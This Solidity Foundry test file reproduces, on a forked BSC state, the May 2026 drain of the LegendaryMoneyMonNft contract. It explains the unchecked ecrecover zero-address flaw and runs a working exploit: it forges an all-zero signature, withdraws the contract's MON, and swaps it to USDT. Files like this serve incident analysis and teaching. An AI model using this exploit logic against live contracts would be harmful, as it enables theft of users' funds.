// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$85.5K USD (85,519.47 USDT)
// Attacker : 0xE1582248C593Df4B367e131922438Fec9D76E787
// Attack Contract : 0x157ba211f05dd2c83006be949e12b2f0f0a0c1d9 (delegated to the attacker EOA via EIP-7702)
// Vulnerable Contract : 0x92D60629FF5d53a0098B51E9b1D59546D1D8e5B6 (LegendaryMoneyMonNft - "Legendary MoneyMon NFTs")
// MON Token : 0xA1C1A7341a1713F174D59926E49E4A1228924100 (Moneymon / MON)
// Attack Tx : 0x15c835c070672948b3487d35254bce96831bec9f5212f78b04e683fed74bf4a2
// @Analysis
// Attack date: May 28, 2026
// Chain: BSC, Block: 100937039
// SlowMist: https://x.com/SlowMist_Team/status/2060205558687486441

// Root Cause:
// LegendaryMoneyMonNft.cliamRewred() lets a user pull an arbitrary ERC20 amount out of the contract
// as long as verify() returns true:
//
//   function verify(address payment,address user,uint _nftid,uint amount,uint _time,string _exname,bytes sig)
//       returns (bool) { ... return recoverSigner(ethSignedMessageHash, sig) == admin; }
//
//   function recoverSigner(bytes32 hash, bytes sig) returns (address) {
//       (bytes32 r, bytes32 s, uint8 v) = splitSignature(sig);
//       return ecrecover(hash, v, r, s);          // <-- never checks for the address(0) return
//   }
//
// `ecrecover` returns address(0) for a malformed signature (e.g. r = s = 0). The contract never rejects
// that, and `changeadmin()` had already been used to set `admin` to the zero address on-chain. So an
// attacker submits cliamRewred(...) with a 65-byte signature of (r=0, s=0, v=27): ecrecover returns
// address(0), which equals admin, verify() passes, and the contract transfers the requested token amount
// to msg.sender. The attacker drains the contract's entire MON balance and swaps it to USDT on PancakeSwap.
//
// Note: the real attack ran the drain logic from the attacker EOA itself via an EIP-7702 SetCode (type-4)
// transaction delegating to 0x157ba211.... For the PoC we use vm.prank to act as the attacker EOA instead.
//
// Function selectors:
// 0x33444682: cliamRewred(address,uint256,uint256,uint256,string,bytes)  -- vulnerable claim
// 0x26ea7ab8: changeadmin(address)                                        -- onlyOwner; admin was set to 0

interface ILegendaryMoneyMonNft {
    function admin() external view returns (address);
    function cliamRewred(
        address _paymentaddress,
        uint256 _amount,
        uint256 _nftid,
        uint256 _time,
        string memory _exname,
        bytes memory signature
    ) external;
}

// PancakeSwap V3 SmartRouter exactInputSingle (no-deadline variant, selector 0x04e45aaf).
interface IPancakeSmartRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract LegendaryMoneyMonNftExploit is Test {
    ILegendaryMoneyMonNft constant NFT = ILegendaryMoneyMonNft(0x92D60629FF5d53a0098B51E9b1D59546D1D8e5B6);
    IERC20 constant MON = IERC20(0xA1C1A7341a1713F174D59926E49E4A1228924100);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeSmartRouter constant ROUTER = IPancakeSmartRouter(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    address constant MON_USDT_POOL = 0x20bDcd1387feE20e42c3B4d328c9D3ad2DEa9e1D; // PancakeV3, fee 2500
    uint24 constant POOL_FEE = 2500;

    address constant ATTACKER = 0xE1582248C593Df4B367e131922438Fec9D76E787;
    uint256 constant ATTACK_BLOCK = 100_937_039;

    function setUp() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
        vm.label(address(NFT), "LegendaryMoneyMonNft");
        vm.label(address(MON), "MON");
        vm.label(address(USDT), "USDT");
        vm.label(address(ROUTER), "PancakeV3SmartRouter");
        vm.label(MON_USDT_POOL, "MON_USDT_V3Pool");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public {
        console.log("--- LegendaryMoneyMonNft cliamRewred ecrecover(address(0)) Signature Bypass ---");
        console.log("Attack date: May 28, 2026  Chain: BSC  Block: %s", ATTACK_BLOCK);

        // The misconfiguration that arms the bug: admin is the zero address on-chain.
        console.log("\nNFT.admin()        :", NFT.admin());
        require(NFT.admin() == address(0), "admin is not the zero address at fork block");

        uint256 monInContract = MON.balanceOf(address(NFT));
        console.log("MON held by victim :", monInContract / 1e18);
        console.log("Attacker USDT before:", USDT.balanceOf(ATTACKER) / 1e18);

        vm.startPrank(ATTACKER);

        // A 65-byte signature of (r = 0, s = 0, v = 27). ecrecover returns address(0) == admin -> verify() passes.
        bytes memory forgedSig = abi.encodePacked(bytes32(0), bytes32(0), uint8(27));
        assertEq(forgedSig.length, 65, "signature must be 65 bytes");

        // Step 1: drain the contract's entire MON balance. _nftid/_time/_exname are irrelevant to the bypass.
        NFT.cliamRewred(address(MON), monInContract, 0, block.timestamp, "", forgedSig);

        uint256 stolenMon = MON.balanceOf(ATTACKER);
        console.log("\n=== After cliamRewred drain ===");
        console.log("MON drained to attacker:", stolenMon / 1e18);
        assertEq(stolenMon, monInContract, "did not drain full MON balance");

        // Step 2: swap the stolen MON to USDT through the PancakeSwap V3 pool (as the real attacker did).
        MON.approve(address(ROUTER), stolenMon);
        uint256 usdtOut = ROUTER.exactInputSingle(
            IPancakeSmartRouter.ExactInputSingleParams({
                tokenIn: address(MON),
                tokenOut: address(USDT),
                fee: POOL_FEE,
                recipient: ATTACKER,
                amountIn: stolenMon,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        vm.stopPrank();

        uint256 usdtProfit = USDT.balanceOf(ATTACKER);
        console.log("\n=== Result ===");
        console.log("MON swapped            :", stolenMon / 1e18);
        console.log("USDT out (this swap)   :", usdtOut / 1e18);
        console.log("Attacker USDT after    :", usdtProfit / 1e18);

        assertGt(usdtProfit, 0, "no USDT profit");
        console.log("\nSignature bypass confirmed: ecrecover(address(0)) == admin drained the MON treasury for ~$85.5K.");
    }
}
